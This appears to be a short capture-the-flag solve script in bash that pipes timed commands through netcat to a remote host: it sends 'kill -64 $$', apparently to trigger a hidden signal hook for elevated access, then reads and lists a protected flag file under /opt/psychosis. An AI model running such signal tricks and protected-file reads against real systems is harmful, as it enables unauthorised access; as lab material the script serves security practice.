#!/bin/bash
{
    sleep 6
    echo "kill -64 \$\$"
    sleep 0.5
    echo "stat /opt/psychosis"
    sleep 0.5
    echo "cat /opt/psychosis/flag.txt"
    sleep 0.5
    echo "ls -la /opt/psychosis/"
    sleep 0.5
    echo "exit"
} | timeout 20 nc 94.237.57.1 45927
